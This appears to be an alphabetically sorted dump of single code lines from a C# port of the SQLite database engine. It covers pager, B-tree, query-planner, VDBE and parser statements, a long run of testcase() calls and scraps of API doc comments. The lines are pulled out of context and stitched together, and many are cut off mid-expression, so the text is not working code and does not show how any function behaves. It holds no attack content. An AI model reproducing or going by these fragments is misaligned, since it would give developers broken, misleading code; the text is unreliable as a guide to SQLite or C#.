          nName = zName.Length - pCons.z.Length
          nNew
          nPage = (u32)( nPageCount 
          nPage = (u32)( pPg.pgno - pg1 ) 
          nPage = 1
          nPage = n / pPager.pageSize
          nPage = nPagePerSector
          nPayload = 0
          nProgressOps
          nQPlan 
          nRec = (u32)( ( szJ - JOURNAL_HDR_SZ( pPager ) ) / JOURNAL_PG_SZ( pPager ) )
          nRec = (u32)( ( szJ - pPager.journalOff ) / JOURNAL_PG_SZ( pPager ) )
          nReserve = 0
          nReserve = zDbHeader[20]
          nRow = pProbe.aiRowEst[0] / 2
          nSignificant
          nSize = (u32)minLocal
          nSize = 0
          nSize = 4
          nSize = EXPR_REDUCEDSIZE 
          nSize = EXPR_TOKENONLYSIZE 
          nSrc = nData
          nVar = SaveBuf[nested].nVar
          needXcommit = true
          negP2 = 1
          newCell[0] = pPage.aData[oldCell 
          newCell[1] = pPage.aData[oldCell 
          newCell[2] = pPage.aData[oldCell 
          newCell[3] = pPage.aData[oldCell 
          newLimit = aHardLimit[limitId]
          newLocktype = EXCLUSIVE_LOCK
          newLocktype = RESERVED_LOCK
          newLocktype = SHARED_LOCK
          next = sqlite3Get4byte(pPage.aData)
          nspace = width - length
          null)
          nxDiv
          nxDiv = 0
          nxDiv = i - 2
          nxDiv = iParentIdx - 1
          obtained from [sqlite3_malloc()]. {END}  The calling function
          of any [sqlite3_bind_blob
          okToChngToIN = 1
          onError = OE_Abort
          onError = overrideError
          onError == OE_None 
          oneTab.a = new SrcList_item[1]
          oneTab.a[0] = pTabItem
          oneTab.nAlloc = 1
          oneTab.nSrc = 1
          openAll = false
          openAll = true
          openedTransaction = 1
          or [sqlite3_open_v2()].
          otherwise an error will be returned.
          p = new PgFreeslot()
          p = null
          p = p.pLeft
          p = p.pNext
          p = p.pRight
          p = pIndex.pTable.pIndex
          p = pParse.aColCache[i]
          p._PgHdr = new PgHdr()
          p.a[i].jointype = p.a[i - 1].jointype
          p.addColOffset = 13 
          p.addrOpenEphm[2] = -1
          p.affChange = false
          p.affChange = true
          p.apCsr[i] = null
          p.apPage[i] = null
          p.approx = true
          p.bDestLocked = 1
          p.cacheStatus = CACHE_STALE
          p.cnt
          p.endpoint.pChunk = pNew
          p.iColumn = iCol
          p.iDivisor = ( p.iSize 
          p.iJD -= p.tz 
          p.iLevel = pParse.iCacheLevel
          p.iNext
          p.iOffset = iOffset = 
          p.iReg 
          p.iReg = 0
          p.iReg = iReg
          p.iTable = iTab
          p.isSorted = false
          p.lru = pParse.iCacheCnt
          p.nChange = 0
          p.nMem = nMem
          p.nPagecount = (u32)nSrcPage
          p.nRemaining = (u32)( nSrcPage 
          p.nVar = (u16)nVar
          p.nullRow = true
          p.pNext = pVfs.pNext
          p.pNext = pcache1.pFree
          p.rSum 
          p.rc = SQLITE_SCHEMA
          p.readOnly = false
          p.selFlags 
          p.startTime = (u64)( ( rNow - (int)rNow ) 
          p.tempReg = 0
          p.u.apSub = new Bitvec[BITVEC_NPTR]
          p.u.apSub[bin] = sqlite3BitvecCreate( p.iDivisor )
          p.usesStmtJournal = true
          p.validHMS = 0
          p.validTZ = 0
          p.validYMD = 0
          p.xDel = null
          p.xDel( ref p.z )
          p1 = 0
          p2 
          p2 = -p2
          pA = pA.pDirty
          pA = pA.pRight
          pAndInfo = new WhereAndInfo()
          pAux.pAux = null
          pB = pB.pDirty
          pB = pB.pRight
          pBest = p
          pBt.inTransaction = p.inTrans
          pBt.incrVacuum = iMeta != 0
          pBt.nTransaction
          pBt.nTransaction--
          pBt.pCursor = pCur.pNext
          pBt.pageSize = (u16)pageSize
          pBt.pageSize = 0
          pBt.pageSizeFixed = true
          pBt.readOnly = true
          pBt.usableSize = (u16)usableSize
          pBt.xFreeSchema(pBt.pSchema)
          pC = pStr2.u.zToken[nPattern - 1]
          pCache.nMin = 10
          pCache.nRef
          pCache.pPage1 = null
          pCache.pPage1 = pPage
          pCache.pPage1.pData = new byte[pCache.szPage]
          pCell = apCell[j]
          pCell = pTemp
          pCol.zColl = pColl.zName
          pCol.zName )
          pColl = db.pDfltColl
          pColl = pColl2.Copy()
          pColl.enc = p.enc
          pColl.pUser= p.pUser
          pColl.type = p.type
          pColl.xCmp = p.xCmp
          pColl.xDel = null
          pColl.xDel = p.xDel
          pColl[0] = new CollSeq()
          pColl[0].enc = SQLITE_UTF8
          pColl[0].zName = zName
          pColl[1] = new CollSeq()
          pColl[1].enc = SQLITE_UTF16LE
          pColl[1].zName = zName
          pColl[2] = new CollSeq()
          pColl[2].enc = SQLITE_UTF16BE
          pColl[2].zName = zName
          pColumn.a[i].idx = -1
          pCost.nRow = nRow
          pCost.plan.nEq = (u32)nEq
          pCost.plan.u.pIdx = pProbe
          pCost.plan.wsFlags 
          pCost.plan.wsFlags = WHERE_ROWID_EQ
          pCost.plan.wsFlags = wsFlags
          pCost.rCost = cost
          pCtx.pVdbeFunc = pVdbeFunc
          pCur.aiIdx[pCur.iPage]
          pCur.aiIdx[pCur.iPage] = (u16)((lwr 
          pCur.aiIdx[pCur.iPage] = (u16)((upr 
          pCur.aiIdx[pCur.iPage] = (u16)upr
          pCur.apPage[i] = null
          pCur.atLast = (u8)(rc == SQLITE_OK 
          pCur.eState = CURSOR_INVALID
          pCur.iPage--
          pCur.info.nSize = 0
          pCur.pKey = pKey
          pCur.pNext.pPrev = pCur.pPrev
          pCur.pPrev.pNext = pCur.pNext
          pCx.aType = new u32[nField]
          pCx.pCursor = new BtCursor()
          pDb = db.aDb[i]
          pDb.pBt = null
          pDb.pSchema.cache_size = size
          pE = pItem.pExpr
          pEList.a[iCol].iAlias = (u16)( 
          pEnd = pTerm
          pEnd = p[i]
          pEnd._Mem = null
          pEnd.flags = MEM_Null
          pEnd.n = 0
          pEnd.z = null
          pEnd.zBLOB = null
          pEntry.chain = elem.next
          pExpr = pNew
          pExpr.affinity = SQLITE_AFF_INTEGER
          pExpr.flags 
          pExpr.iColumn = -1
          pExpr.iTable = 
          pExpr.op = TK_NULL
          pExpr.op = TK_STRING
          pExpr.pColl = pColl
          pFKey.aCol[i].zCol = pToCol.a[i].zName
          pFile = null
          pFile.fs.Lock( offset 
          pFinal = pOrWc.a[pOrWc.nTerm - 1]
          pFrom.a[0].pSelect = pDup
          pFrom.a[0].zAlias = pView.zName
          pFrom.pTab = pTab =
          pFrom.pTab = pTab = new Table()
          pHash = p.pHash
          pIdx.tnum = iTo
          pIdx_zColAff.Append( pTab.aCol[pIdx.aiColumn[n]].affinity )
          pIn = aOp[i]
          pIn = pLevel.u._in.aInLoop[pLevel.u._in.nIn - 1]
          pIn.iCur = iTab
          pIndex.pNext = pOther.pNext
          pIndex.pNext = pTab.pIndex
          pIndex.pTable.pIndex = pIndex.pNext
          pIndex.tnum = db.init.newTnum
          pInfo = new AutoincInfo()
          pInfo.aColl[i] = pColl
          pInfo.aSortOrder[i] = (byte)pItem.sortOrder
          pInfo.iDb = iDb
          pInfo.nLocal = (u16)minLocal
          pInfo.nLocal = (u16)surplus
          pInfo.pNext = pParse.pAinc
          pInfo.pTab = pTab
          pInfo.regCtr = 
          pItem = p.a[p.nExpr - i]
          pItem = pList.a[i]
          pItem = pOrderBy.a[i]
          pItem = pSrc.a[pSrc.nSrc - i]
          pItem.iCol = (u16)iCol
          pItem.iCursor = pParse.nTab
          pItem.isPopulated = 1
          pItem.notIndexed = 1
          pItem.zDatabase = zDb
          pKey.aSortOrder[i] = pIdx.aSortOrder[i]
          pKeyDup.aColl = new CollSeq[nExpr]
          pKeyDup.aSortOrder = new byte[nExpr]
          pKeyDup.enc = ENC( db )
          pKeyDup.nField = (u16)nExpr
          pKeyInfo = _p4.pKeyInfo.Copy()
          pKeyInfo.aColl[i] = apColl
          pKeyMerge.aColl = new CollSeq[nOrderBy]
          pKeyMerge.aSortOrder = new byte[nOrderBy]
          pKeyMerge.enc = ENC( db )
          pKeyMerge.nField = (u16)nOrderBy
          pLeft = pDup.pLeft
          pLevel.addrNxt = sqlite3VdbeMakeLabel( v )
          pLevel.iIdxCur = -1
          pLevel.iIdxCur = pParse.nTab
          pLevel.op = OP_Return
          pLevel.op = aStep[bRev]
          pLevel.p1 = iCur
          pLevel.p1 = regReturn
          pLevel.p2 = 1 
          pLevel.p5 = SQLITE_STMTSTATUS_FULLSCAN_STEP
          pLevel.u._in.aInLoop[pLevel.u._in.nIn - 1] = new InLoop()
          pLevel.u._in.nIn = 0
          pLink.pNext = pTab.pTrigger
          pMem = p.pResultSet[i_pMem
          pMem._Mem = new Mem()
          pMem._Mem.flags = 0
          pMem._SumCtx = new SumCtx()
          pMem.enc = SQLITE_UTF8
          pMem.flags = MEM_Agg
          pMem.flags = MEM_Dyn 
          pMem.flags = MEM_Int
          pMem.flags = MEM_Null
          pMem.flags = MEM_Static 
          pMem.n = 2
          pMem.n = sqlite3Strlen30( pMem.z )
          pMem.type = SQLITE_INTEGER
          pMem.type = SQLITE_TEXT
          pMem.u.i = i
          pMem.u.i = pOp.p3
          pMem.u.pDef = p.pFunc
          pMem.z = null
          pMem.z = sqlite3OpcodeName( pOp.opcode )
          pMem.z = z
          pMem.zBLOB = Encoding.UTF8.GetBytes( z )
          pMem.zBLOB = new byte[n]
          pMem.zBLOB = null
          pNC = pNC.pNext
          pName.z )
          pName.z.Length - pEnd.z.Length 
          pNew = apNew[i] = apOld[i]
          pNew = pOld
          pNew = pPrior
          pNew.eOperator = operatorMask( pDup.op )
          pNew.flags 
          pNew.leftCursor = pLeft.iTable
          pNew.pNext = null
          pNew.pPrior = pPrior
          pNew.pRightmost = null
          pNew.prereqAll = prereqAll
          pNew.prereqRight = prereqLeft
          pNew.u.leftColumn = pLeft.iColumn
          pNext = p.pDirtyNext
          pOp = p.aOp[addr 
          pOp = p.aOp[i]
          pOp = p.aOp[j]
          pOp.opcode = OP_Noop
          pOp.p2 = aLabel[-1 - pOp.p2]
          pOp.p4type = P4_KEYINFO
          pOp.p4type = P4_NOTUSED
          pOrWc = pTerm.u.pOrInfo.wc
          pOrderBy = ( ( i == 0 
          pOrderBy = null
          pOrderBy = p.pOrderBy
          pOther.pNext = pIndex
          pOut = p.aMem[pOp.p2]
          pOut.flags = MEM_Null
          pOut.n = 0
          pOut.opcode = pIn.opcode
          pOut.p1 = pIn.p1
          pOut.p3 = pIn.p3
          pOut.p4.p = null
          pOut.p4type = P4_NOTUSED
          pOut.p5 = 0
          pOut.zComment = null
          pPage = null
          pPage = pCur.apPage[pCur.iPage]
          pPage.nOverflow = 0
          pPage.pCache = pCache
          pPage.pData = new byte[pCache.szPage]
          pPage.pLruNext = pcache1.pLruHead
          pPage.pLruNext.pLruPrev = pPage.pLruPrev
          pPage.pLruPrev.pLruNext = pPage.pLruNext
          pPage.pgno = pgno
          pPager = sqlite3BtreePager( pBtree )
          pPager.aSavepoint[ii].iHdrOffset = pPager.journalOff
          pPager.dbFileSize = (Pgno)nPage
          pPager.dbFileSize = (u32)pgno
          pPager.dbSize = (Pgno)nPage
          pPager.dbSize = dbSize
          pPager.dbSize = mxPg
          pPager.dbSize = pPager.dbOrigSize
          pPager.dbSizeValid = false
          pPager.dbSizeValid = true
          pPager.errCode = rc
          pPager.journalHdr = 0
          pPager.journalOff = 0
          pPager.journalStarted = false
          pPager.nRec = 0
          pPager.nSubRec = 0
          pPager.setMaster = 0
          pPager.state = (u8)locktype
          pPager.state = PAGER_RESERVED
          pPager.state = PAGER_SHARED
          pParent.nOverflow = 0
          pParent.pHaving = pParent.pWhere
          pParent.pLimit = pSub.pLimit
          pParent.pOrderBy = pSub.pOrderBy
          pParent.pWhere = pWhere
          pParse.aTempReg[pParse.nTempReg
          pParse.cookieMask 
          pParse.cookieValue[iDb] = db.aDb[iDb].pSchema.schema_cookie
          pParse.db = pDb
          pParse.nErr
          pParse.nMem
          pParse.nMem 
          pParse.nMem = 3
          pParse.nMem = regRec
          pParse.nTab = 2
          pParse.nVar = i
          pParse.pAinc = pInfo
          pParse.pZombieTab = pTabToDel
          pParse.rc = SQLITE_SCHEMA
          pParse.rc = SQLITE_TOOBIG
          pParse.rc = rc
          pParse.trigStack = trigStackEntry
          pParse.trigStack = trigStackEntry.pNext
          pPayload = pOvfl.aData
          pPgno = nearby
          pPrevTrunk = null
          pPrevTrunk = pTrunk
          pPrior = pOvfl.aData
          pPtrmap[offset] = eType
          pRC = rc
          pRC = setChildPtrmaps(pTo)
          pRec.flags = (u16)( pRec.flags 
          pRec.z = sb.ToString()
          pRec.zBLOB = null
          pRes = -1
          pRes = 0
          pRes = 1
          pRes = c
          pRight.pOn = null
          pRoot = pPageMove
          pRoot.pLeft = pLeft
          pRoot.pRight = pRight
          pRowSet.pEntry = null
          pRowSet.pLast = null
          pRowSet.pTree = rowSetListToTree( pRowSet.pEntry )
          pSelTab.aCol = null
          pSelTab.nCol = 0
          pSrc = pData
          pSrc.a[i 
          pSrc.a[pSrc.nSrc - 1].zDatabase = db.aDb[iDb].zName
          pStart = pEnd
          pSub.pLimit = null
          pSub.pOrderBy = null
          pSubSrc.a[i] = new SrcList_item()
          pSynced = pSynced.pDirtyPrev
          pT = apNew[i]
          pTab = (Table)k.data
          pTab = pTabList.a[j].pTab
          pTab->aCol[iCol].isHidden = 1
          pTab.dbMem = db.lookaside.bEnabled != 0 
          pTab.iPKey = -1
          pTab.nRef
          pTab.nRef = 1
          pTab.pIndex = pIndex
          pTab.pTrigger = pLink
          pTab.tabFlags 
          pTab.tnum = iTo
          pTabCol = pTab.aCol[j]
          pTabItem = pTabList.a[j]
          pTabToDel.nRef--
          pTabToDel.pNextZombie = pParse.pZombieTab
          pTable.aCol = pSelTab.aCol
          pTable.nCol = 0
          pTable.nCol = pSelTab.nCol
          pTable.pSchema.flags 
          pTail = pA
          pTail = pB
          pTail = pTail.pRight
          pTail.pDirty = pA
          pTail.pDirty = pB
          pTail.pRight = pA
          pTail.pRight = pB
          pTemp = new byte[sz]
          pTerm = pLevel.plan.u.pTerm
          pTerm = pStart
          pTerm = pWC.a[idxTerm]
          pTerm = pWC.a[j]
          pTerm.eOperator = 0
          pTerm.eOperator = operatorMask( op )
          pTerm.leftCursor = pLeft.iTable
          pTerm.nChild = 2
          pTerm.u.leftColumn = pLeft.iColumn
          pTerm.wtFlags 
          pTo.flags 
          pToRelease = pOvfl
          pTopNC = pTopNC.pNext
          pTopNC.nRef
          pTrigger = pTrigger.pNext
          pTrigger.pSchema == db.aDb[1].pSchema )
          pVal.r = (double)-1 
          pVal.u.i = -1 
          pVar = p.aVar[i - 1]
          pVdbeFunc = new VdbeFunc()
          pWC.a[idxNew1].iParent = idxTerm
          pWC.a[idxNew2].iParent = idxTerm
          pWC.a[idxNew].iParent = idxTerm
          pWalker.u.i = 0
          pWhere = null
          pX = pEnd.pExpr
          pX = pStart.pExpr
          p[i] = (char)( _p 
          p[offset 
          pageSize - usableSize)
          pager_reset( pPager )
          pc = next
          pcache1.nCurrentPage
          pcache1.nCurrentPage -= ( ( pPage.pCache.bPurgeable 
          pcache1.nCurrentPage--
          pcache1.nMinPage 
          pcache1.pFree = p
          pcache1.pLruHead = pPage
          pcache1.pLruHead = pPage.pLruNext
          pcache1.pLruHead.pLruPrev = pPage
          pcache1.pLruTail = pPage
          pcache1.pLruTail = pPage.pLruPrev
          pcache1EnterMutex()
          pcache1FreePage( ref pPage )
          pcache1LeaveMutex()
          pcacheAddToDirtyList( p )
          pcacheRemoveFromDirtyList( p )
          pcacheUnpin( p )
          pgno = 1
          pgnoRoot
          pisComplete = cnt >= z.Length - 1 
          pnHeight = p.nHeight
          pnPattern = cnt
          pp = ( pp ).pNext
          ppFile = pFile
          ppOrderBy = null
          prNotFound = rMayHaveNull = 
          precision = -1
          precision = 0
          precision = etBUFSIZE - 40
          prevEscape = false
          prevEscape = true
          public InLoop[] aInLoop
          public int nIn
          r = cntNew[i - 1] - 1
          rc 
          rc = -1
          rc = 0
          rc = 1
          rc = SQLITE_BUSY
          rc = SQLITE_CANTOPEN
          rc = SQLITE_CORRUPT_BKPT()
          rc = SQLITE_ERROR
          rc = SQLITE_IOERR_UNLOCK
          rc = SQLITE_NOMEM
          rc = SQLITE_OK
          rc = attr != 0 
          rc = attr == 0 
          rc = autoVacuumCommit(pBt)
          rc = i
          rc = moveToLeftmost(pCur)
          rc = moveToRightmost(pCur)
          rc = nKey1 - nKey2
          rc = newDatabase(pBt)
          rc = pager_open_journal( pPager )
          rc = rc2
          rc = readDbPage( pPg )
          rc = sqlite3BtreeSchemaLocked( pBt )
          rc = sqlite3PagerWrite( pPgHdr )
          rc = sqlite3PagerWrite(pBt.pPage1.pDbPage)
          rc = sqlite3PagerWrite(pLastPg.pDbPage)
          rc = sqlite3PagerWrite(pNew.pDbPage)
          rc = sqlite3PagerWrite(pParent.pDbPage)
          rc = sqlite3PagerWrite(pRoot.pDbPage)
          rc = sqlite3PagerWrite(pTrunk.pDbPage)
          rc = sqlite3VdbeMemMakeWriteable( pTo )
          rc = sqlite3_os_init()
          rc = sqlite3_step( pStmt )
          rc = subjournalPage( pPg )
          rc = writeJournalHdr( pPager )
          rc2 
          reg = 
          reg = 0
          regAgg = 0
          regOutputRow = 
          regRec = sqlite3GetTempReg( pParse )
          regReset = 
          regTempRowid = sqlite3GetTempReg( pParse )
          releasePage(p.apPage[i])
          releasePage(pCur.apPage[i])
          releasePage(pCur.apPage[pCur.iPage--])
          releasePage(pLastPg)
          releasePage(pPage)
          releasePage(pPage1)
          releasePage(pPageMove)
          releasePage(pPrevTrunk)
          releasePage(pPtrPage)
          releasePage(pRoot)
          releasePage(pToRelease)
          releasePage(ppPage)
          res = 0
          res = 1
          return
          return ( (Bitmask)1 ) << i
          return (MemPage)ap[vaNEXT - 1]
          return (SrcList)ap[vaNEXT - 1]
          return (Token)ap[vaNEXT - 1]
          return (double)0
          return (sqlite3_mem_methods)ap[vaNEXT - 1]
          return (void_function)ap[vaNEXT - 1]
          return -1
          return 0
          return 1
          return 8 
          return Convert.ToDouble( ap[vaNEXT - 1] )
          return Convert.ToInt64( ap[vaNEXT - 1] )
          return Convert.ToUInt16( ap[vaNEXT - 1] )
          return SQLITE_AFF_NONE
          return SQLITE_AFF_NUMERIC
          return SQLITE_BUSY
          return SQLITE_CANTOPEN
          return SQLITE_CONSTRAINT
          return SQLITE_CORRUPT_BKPT()
          return SQLITE_DONE
          return SQLITE_ERROR
          return SQLITE_NOMEM
          return SQLITE_OK
          return SQLITE_TOOBIG
          return WRC_Abort
          return WRC_Continue
          return WRC_Prune
          return aCode[i]
          return ap[vaNEXT - 1]
          return cp
          return elem
          return false
          return i 
          return iValue[i]
          return idx_affinity == SQLITE_AFF_TEXT
          return idx_affinity >= SQLITE_AFF_NUMERIC
          return null
          return p
          return p.iReg
          return p.n 
          return p.z == null 
          return pCur.skipNext
          return pTerm
          return rc
          return true
          rowSetToList( pRowSet )
          sAggInfo.sortingIdx = pParse.nTab
          sNC = new NameContext()
          sNC.allowAgg = 0
          sNC.pParse = pParse
          sbZ.Append( z[i] )
          scan of the entire table.
          seen = 0
          setSectorSize( pPager )
          should free this memory by calling [sqlite3_free()].
          sign = -1
          sortOrder = termSortOrder
          spaceLeft = pBt.usableSize - 4
          sqlite3 db = pParse.db
          sqlite3Atoi64( negFlag 
          sqlite3AutoincrementBegin( pParse )
          sqlite3BeginBenignMalloc()
          sqlite3BitvecDestroy( ref p.u.apSub[i] )
          sqlite3BitvecDestroy( ref pPager.aSavepoint[ii].pInSavepoint )
          sqlite3BtreeClose( ref db.aDb[iDb].pBt )
          sqlite3BtreeClose( ref pDb.pBt )
          sqlite3BtreeCloseCursor(pTmp)
          sqlite3BtreeCommit( pBt )
          sqlite3BtreeEnter( pBtree )
          sqlite3BtreeLeave( pBtree )
          sqlite3BtreeLeave(p)
          sqlite3BtreeRollback( db.aDb[i].pBt )
          sqlite3CompleteInsertion(
          sqlite3DeleteTable( ref pSelTab )
          sqlite3EndBenignMalloc()
          sqlite3ErrorClear( pParse )
          sqlite3ExpirePreparedStatements( db )
          sqlite3ExprCacheClear( pParse )
          sqlite3GlobalConfig.isInit = 1
          sqlite3GlobalConfig.pInitMutex = sqlite3MutexAlloc( SQLITE_MUTEX_RECURSIVE )
          sqlite3MallocAlarm( nFull )
          sqlite3MemJournalOpen( pPager.jfd )
          sqlite3MemJournalOpen( pPager.sjfd )
          sqlite3OsClose( pPager.jfd )
          sqlite3OsCloseFree( pMaster )
          sqlite3PagerClose(pBt.pPager)
          sqlite3PagerGetExtra( pDestPg ).isInit = 0
          sqlite3PagerRollback(pPager)
          sqlite3PagerUnref(pOvfl.pDbPage)
          sqlite3PcacheMakeClean( pPg )
          sqlite3RowSetClear( p )
          sqlite3RowSetClear( p.u.pRowSet )
          sqlite3RowSetClear( pMem.u.pRowSet )
          sqlite3SafetyOff( db )
          sqlite3SchemaFree( pDb.pSchema )
          sqlite3VdbeIntegerAffinity( pRec )
          sqlite3VdbeMemRelease( p )
          sqlite3VdbeMemRelease( pMem )
          sqlite3VdbeMemReleaseExternal( pMem )
          sqlite3VdbeMemReleaseExternal( pOut )
          sqlite3VtabCommit( db )
          sqlite3_diskfull.iValue = 1
          sqlite3_diskfull_pending.iValue--
          sqlite3_file fd
          sqlite3_finalize( ref pStmt )
          sqlite3_index_info pInfo = pWInfo.a[i].pIdxInfo
          sqlite3_interrupt_count--
          sqlite3_io_error_hit.iValue = 1
          sqlite3_mutex_enter( pVm.db.mutex )
          sqlite3_mutex_enter(db.mutex)
          sqlite3_mutex_leave( db.mutex )
          sqlite3_mutex_leave( mem0.mutex )
          sqlite3_mutex_leave(db.mutex)
          sqlite3_pager_writedb_count.iValue = iValue
          sqlite3_reset( pStmt )
          sqlite3_result_error_toobig( context )
          sqliteResetColumnNames( pTab )
          srcTab = pParse.nTab
          startEq = 0
          start_constraints = 1
          string z
          string z = p.azVar[i]
          string zAs = pEList.a[i].zName
          string zCol
          string zColl
          string zColl = pIdx.azColl[i]
          string zErr = sqlite3_value_text( db.pErr )
          string zMsg
          string zName = pEList.a[i].zName
          string zName = pParse.sNameToken.z
          string zTempFilename
          subtotal = 0
          switch ( c )
          switch ( onError )
          sz = szCell[j] 
          szCell[nCell] = (u16)(szCell[nCell] - leafCorrection)
          szCell[nCell] = sz
          szLeft -= szCell[r] 
          szNew[k] = subtotal - szCell[i]
          szRight 
          t = (int)apNew[i].pgno
          t = wsdPrng.s[wsdPrng.j]
          testcase( ( pSub1.selFlags 
          testcase( i == 0 )
          testcase( i == 1 )
          testcase( i == 10 )
          testcase( i == 100 )
          testcase( i == 101 )
          testcase( i == 102 )
          testcase( i == 103 )
          testcase( i == 104 )
          testcase( i == 105 )
          testcase( i == 106 )
          testcase( i == 107 )
          testcase( i == 108 )
          testcase( i == 109 )
          testcase( i == 11 )
          testcase( i == 110 )
          testcase( i == 111 )
          testcase( i == 112 )
          testcase( i == 113 )
          testcase( i == 114 )
          testcase( i == 115 )
          testcase( i == 116 )
          testcase( i == 117 )
          testcase( i == 118 )
          testcase( i == 12 )
          testcase( i == 13 )
          testcase( i == 14 )
          testcase( i == 15 )
          testcase( i == 16 )
          testcase( i == 17 )
          testcase( i == 18 )
          testcase( i == 19 )
          testcase( i == 2 )
          testcase( i == 20 )
          testcase( i == 21 )
          testcase( i == 22 )
          testcase( i == 23 )
          testcase( i == 24 )
          testcase( i == 25 )
          testcase( i == 26 )
          testcase( i == 27 )
          testcase( i == 28 )
          testcase( i == 29 )
          testcase( i == 3 )
          testcase( i == 30 )
          testcase( i == 31 )
          testcase( i == 32 )
          testcase( i == 33 )
          testcase( i == 34 )
          testcase( i == 35 )
          testcase( i == 36 )
          testcase( i == 37 )
          testcase( i == 38 )
          testcase( i == 39 )
          testcase( i == 4 )
          testcase( i == 40 )
          testcase( i == 41 )
          testcase( i == 42 )
          testcase( i == 43 )
          testcase( i == 44 )
          testcase( i == 45 )
          testcase( i == 46 )
          testcase( i == 47 )
          testcase( i == 48 )
          testcase( i == 49 )
          testcase( i == 5 )
          testcase( i == 50 )
          testcase( i == 51 )
          testcase( i == 52 )
          testcase( i == 53 )
          testcase( i == 54 )
          testcase( i == 55 )
          testcase( i == 56 )
          testcase( i == 57 )
          testcase( i == 58 )
          testcase( i == 59 )
          testcase( i == 6 )
          testcase( i == 60 )
          testcase( i == 61 )
          testcase( i == 62 )
          testcase( i == 63 )
          testcase( i == 64 )
          testcase( i == 65 )
          testcase( i == 66 )
          testcase( i == 67 )
          testcase( i == 68 )
          testcase( i == 69 )
          testcase( i == 7 )
          testcase( i == 70 )
          testcase( i == 71 )
          testcase( i == 72 )
          testcase( i == 73 )
          testcase( i == 74 )
          testcase( i == 75 )
          testcase( i == 76 )
          testcase( i == 77 )
          testcase( i == 78 )
          testcase( i == 79 )
          testcase( i == 8 )
          testcase( i == 80 )
          testcase( i == 81 )
          testcase( i == 82 )
          testcase( i == 83 )
          testcase( i == 84 )
          testcase( i == 85 )
          testcase( i == 86 )
          testcase( i == 87 )
          testcase( i == 88 )
          testcase( i == 89 )
          testcase( i == 9 )
          testcase( i == 90 )
          testcase( i == 91 )
          testcase( i == 92 )
          testcase( i == 93 )
          testcase( i == 94 )
          testcase( i == 95 )
          testcase( i == 96 )
          testcase( i == 97 )
          testcase( i == 98 )
          testcase( i == 99 )
          testcase( idxNew == 0 )
          testcase( j == 1 )
          testcase( pExpr.op == TK_AGG_COLUMN )
          testcase( pExpr.op == TK_AGG_FUNCTION )
          testcase( pExpr.op == TK_COLUMN )
          testcase( pExpr.op == TK_EXISTS )
          testcase( pExpr.op == TK_ID )
          testcase( pExpr.op == TK_SELECT )
          testcase( pTerm.wtFlags 
          testcase( rc == SQLITE_NOMEM )
          testcase( wsFlags 
          testcase(iTrunk == mxPage)
          that is obtained from [sqlite3_malloc()].
          the root of the tree.
          then [sqlite3_reset(S)] returns [SQLITE_OK].
          tname.n = len
          tname.z = zSql.Substring( zCsr )
          to access the data.
          to turn extension loading on and call it with onoff==0 to turn
          toTheLeft 
          trigStackEntry.ignoreJump = ignoreJump
          trigStackEntry.newIdx = newIdx
          trigStackEntry.oldIdx = oldIdx
          trigStackEntry.pNext = pParse.trigStack
          trigStackEntry.pTab = pTab
          trigStackEntry.pTrigger = p
          try
          u16 size = 1024
          u16 sz = (u16)szNew[i]
          u32 Dummy0 = 0
          u32 mask
          u32 pg = (u32)( pg1 
          u32 piColMask = 0
          u8 c = pMem.z != null 
          u8 eType = 0
          u8 encoding
          u8[] aMoveOp = new u8[]{
          u8[] pCell
          u8[] pTemp
          unchecked { pNew.flags 
          unlockBtreeIfUnused(pBt)
          useTempTable = true
          v = (u32)v64
          v = (ulong)BitConverter.DoubleToInt64Bits( pMem.r )
          v = (ulong)pMem.u.i
          v = 0xffffffff
          v = sqlite3GetVdbe( pParse )
          v = v 
          v >>= 7
          v >>= 8
          v.expired = false
          v1 = v1 
          va_end( ap )
          vfprint.
          while ( ( pPage = pNext ) != null )
          while ( ALWAYS( p != null ) 
          while ( _fmt < fmt.Length 
          while ( c >= '0' 
          while ( c2 != 0 
          while ( eval >= 1 ) { scale 
          while ( eval >= 16 ) { scale 
          while ( eval >= 4 ) { scale 
          while ( eval >= 64 ) { scale 
          while ( nIn > 0 )
          while ( p != null )
          while ( pColExpr.op == TK_DOT ) pColExpr = pColExpr.pRight
          while ( pOther.pNext != null 
          while ( pSel.pPrior != null ) pSel = pSel.pPrior
          while ( pSel.pPrior != null ) { pSel = pSel.pPrior
          while ( sqlite3Isdigit( z[zDx] ) )
          while ( zIndex != zIn.Length 
          while ( zIndex < zDate.Length 
          while (maxRootPgno == PENDING_BYTE_PAGE(pBt)
          width = etBUFSIZE - 12
          wsFlags 
          wsFlags = 0
          wsdAutoext.aExt[i]
          wsdPrng.j = (u8)( wsdPrng.j 
          wsdPrng.s[i] = (u8)i
          wsdPrng.s[i] = t
          wsdPrng.s[wsdPrng.j] = wsdPrng.s[i]
          x = pnext 
          x>='abc' AND x<'abd' AND x LIKE 'abc%'
          xInit = (dxInit)
          xInit = null
          yield coA
          yield coB
          yymajor = YYNOCODE
          yypParser.yyerrcnt = 3
          yypParser.yyerrcnt--
          z = new StringBuilder( (int)n )
          z = sqlite3ErrStr( db.errCode )
          z = zBuf
          zBlob.Append( Convert.ToChar( ( hexToInt( z[i] ) << 4 ) 
          zBuf.Append( 's' )
          zBuf.Append( 't' )
          zBuf.Append( 'z' )
          zBuf.Append( zCsr )
          zColAff.Append( pTab.aCol[i].affinity )
          zColl = pColl.zName
          zColl = pIdx.azColl[i]
          zColl = pListItem.pExpr.pColl.zName
          zColl = pTab.aCol[j].zColl
          zColl = zExtra.ToString()
          zDb = db.aDb[iDb].zName
          zDx
          zHex.Append( hexdigits[( c >> 4 ) 
          zHex.Append( hexdigits[c 
          zIndex
          zLoc = zCsr
          zOut = Path.GetFullPath( zRelative )
          zPathname.Length = 0
          zSql = zLeftover
          zStmt = null
          zTempFilename = zTmpname.ToString()
          zVal = pExpr.u.zToken
          {
          {  /
          { /
          { sqlite3CommitTransaction(pParse)
          { sqlite3FinishCoding(pParse)
          { sqlite3RollbackTransaction(pParse)
          { sqlite3Vacuum(pParse)
          { sqlite3VtabArgInit(pParse)
          { yygotominor.yy0 = yymsp[-1].minor.yy0
          { yygotominor.yy0 = yymsp[0].minor.yy0
          { yygotominor.yy0.n = 0
          { yygotominor.yy0.z = null
          { yygotominor.yy132 = null
          { yygotominor.yy132 = yymsp[0].minor.yy346.pExpr
          { yygotominor.yy14 = null
          { yygotominor.yy14 = yymsp[-1].minor.yy14
          { yygotominor.yy14 = yymsp[0].minor.yy14
          { yygotominor.yy186 = (u8)yymsp[0].minor.yy328
          { yygotominor.yy186 = OE_Default
          { yygotominor.yy186 = OE_Replace
